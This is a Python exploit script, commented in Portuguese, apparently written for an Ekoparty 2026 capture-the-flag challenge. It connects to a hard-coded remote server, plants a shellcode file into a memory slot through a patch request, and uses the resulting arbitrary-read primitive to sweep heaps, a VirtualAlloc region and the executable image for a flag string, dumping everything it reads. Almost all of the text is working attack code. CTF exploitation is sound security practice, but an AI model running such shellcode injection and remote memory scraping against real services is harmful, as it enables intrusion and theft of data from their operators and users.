#!/usr/bin/env python3
# 1 conexao, read arbitrario (sc_absread). Varre as regioes ainda nao cobertas atras de HIK_:
#   - VirtualAlloc ~0x1200000 (pos-wipe da 1a pagina), onde 0xe370/0xe3a0 apontam
#   - os 4 heaps (ProcessHeaps@0x7ffaf4673da0), 1o segmento de cada
#   - EXE 0x140000000 estendido (sem ASLR)
# Para cedo cada range apos N paginas STALE/zero consecutivas. Uso: python3 scan_all.py
import socket, struct, re, os, time
HOST, PORT = "63.183.92.113", 20269
COOKIE  = b"Ekoparty 2026 - Binary Gecko CTF challenge"
HEALTHY = b"Welcome to this CTF\x00"
SLOT    = 0x1620
HIK     = re.compile(rb'HIK_[\x20-\x7e]{6,200}')
D       = os.path.dirname(os.path.abspath(__file__))
u64 = lambda b,o=0: struct.unpack("<Q", b[o:o+8])[0]
PROC_HEAPS_PTR = 0x7ffaf4673da0

def rd(s,n,to=8.0):
    s.settimeout(to); b=b""
    try:
        while len(b)<n:
            c=s.recv(n-len(b))
            if not c: break
            b+=c
    except (socket.timeout, ConnectionResetError, OSError): pass
    return b
def req(s,flag,counter,length,body=b""):
    s.sendall(struct.pack("<IBII",13+len(body),flag,counter,length)+body); return rd(s,length)
def healthy(tries=12,wait=80):
    for i in range(tries):
        try:
            s=socket.create_connection((HOST,PORT),timeout=8); s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
        except Exception as e:
            print("connect fail:",e); time.sleep(wait); continue
        s.sendall(COOKIE); b=rd(s,20)
        if b==HEALTHY: print(f"[+] banner OK (tent {i+1})"); return s
        print(f"[.] degradado, retry {i+1}/{tries} em {wait}s"); s.close()
        if i<tries-1: time.sleep(wait)
    return None
def absread(s,addr,length):
    return req(s,0,0,length,struct.pack("<Q",addr).ljust(max(length,8),b"\x00"))

def sweep(s, name, base, size, found, dump, max_stale=20):
    print(f"\n== {name}: 0x{base:x}..0x{base+size:x} ==")
    prev=None; stale=0
    for off in range(0,size,0x1000):
        r=absread(s,base+off,0x1000)
        if len(r)==0: print("  conexao caiu"); return False
        m=HIK.search(r)
        if m:
            fl=m.group().decode(errors='replace'); print(f"  >>> HIK @0x{base+off:x}: {fl}"); found.append(fl); return True
        z=(sum(r)==0); st=(r==prev)
        if z or st:
            stale+=1
            if stale>=max_stale:
                print(f"  (stop: {max_stale} paginas vazias/STALE desde 0x{base+off-max_stale*0x1000:x})"); break
        else:
            stale=0
            asc=''.join(chr(x) if 32<=x<127 else '.' for x in r[:28])
            print(f"  0x{base+off:x}: {r[:12].hex()} | {asc}")
        dump+=r; prev=r
    return True

def main():
    s=healthy()
    if not s: print("sem banner apos retries; aguardar restart (10min) e repetir."); return
    sc=open(os.path.join(D,"sc_absread.bin"),"rb").read()
    if len(req(s,2,SLOT,len(sc),sc))==0: print("[!] patch falhou"); s.close(); return
    print(f"[+] sc_absread plantado ({len(sc)}B) -- (1a pagina de 0x1200000 foi wipeada pelo flag=2)")

    found=[]; dump=bytearray()
    # heaps vivos
    arr=absread(s,PROC_HEAPS_PTR,16*8)
    heaps=[u64(arr,i*8) for i in range(16) if 0x10000<=u64(arr,i*8)<0x7ff000000000]
    print("[heaps]", ", ".join(hex(h) for h in heaps))

    ranges=[("VAlloc_0x1200000", 0x1201000, 0x60000)]           # pula 1a pagina wipeada
    for i,h in enumerate(heaps): ranges.append((f"heap{i}", h, 0x40000))
    ranges.append(("EXE_0x140000000", 0x140000000, 0x90000))

    for name,b,sz in ranges:
        if found: break
        if not sweep(s,name,b,sz,found,dump): break
    s.close()
    open(os.path.join(D,"scan_all_dump.bin"),"wb").write(dump)
    print(f"\n[+] dump: scan_all_dump.bin ({len(dump)}B)")
    print("\n== RESUMO ==")
    if found:
        for f in set(found): print("FLAG2 CANDIDATA:", f)
    else:
        print("nenhum HIK_. restam: stacks (TEB->StackBase) e regioes VirtualAlloc nao mapeadas por ponteiro.")

if __name__=="__main__": main()
